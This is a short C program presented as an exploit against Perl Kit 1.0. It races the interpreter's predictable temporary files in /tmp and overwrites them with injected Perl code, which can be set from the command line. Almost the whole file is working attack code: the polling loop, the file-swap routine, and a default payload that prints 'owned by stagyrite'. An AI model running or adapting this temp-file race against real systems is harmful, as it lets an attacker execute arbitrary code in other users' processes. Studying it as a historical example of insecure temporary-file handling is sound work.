/*
 * Perl Harbor: exploit against Perl Kit 1.0
 *
 * gcc -o perl-harbor perl-harbor.c
 * ./perl-harbor &
 * Perl-1.0/perl -e 'print "hello, world\n";'
 *
 * Successful execution ends with printing "owned by stagyrite".
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>

#define PREFIX "perl-e"

char *perlcode = "print \"owned by stagyrite\n\";";
int done = 0;

int zero(const struct dirent **a, const struct dirent **b) {
        return 0;
}

void swap(const char *fname) {
        int out;

        /* Open a file for writing. */

        if ((out = open(fname, O_WRONLY | O_TRUNC, 0666)) == -1){
                perror(fname);
                exit(-1);
        }

        /* Swap a Perl program now. */

        if (write(out, perlcode, strlen(perlcode)) == -1) {
                perror(fname);
                exit(-1);
        }

        close(out);
}

void do_exploit(const char *fname) {
        struct stat stbuf;

        /* Wait for it. */

        do {
                stat(fname, &stbuf);
        } while (stbuf.st_size == 0);

        swap(fname);
        done = 1;
}

int exploit(const struct dirent *s) {

        if (strncmp(PREFIX, s->d_name, strlen(PREFIX)) == 0) {
                do_exploit(s->d_name);
        }

        return -1;
}

int main(int argc, char *argv[]) {
        struct dirent **namelist;

        if (argc > 1) {
                /* Set a Perl code passed in as a command-line argument. */
                perlcode = argv[1];
        }

        chdir("/tmp");
        /* Actively wait for a temporary file to appear. */

        while (!done) {

                if (scandir("/tmp", &namelist, exploit, zero) == -1) {
                        perror("scandir()");
                        exit(-1);
                }

        }

        exit(0);
        return 0;
}
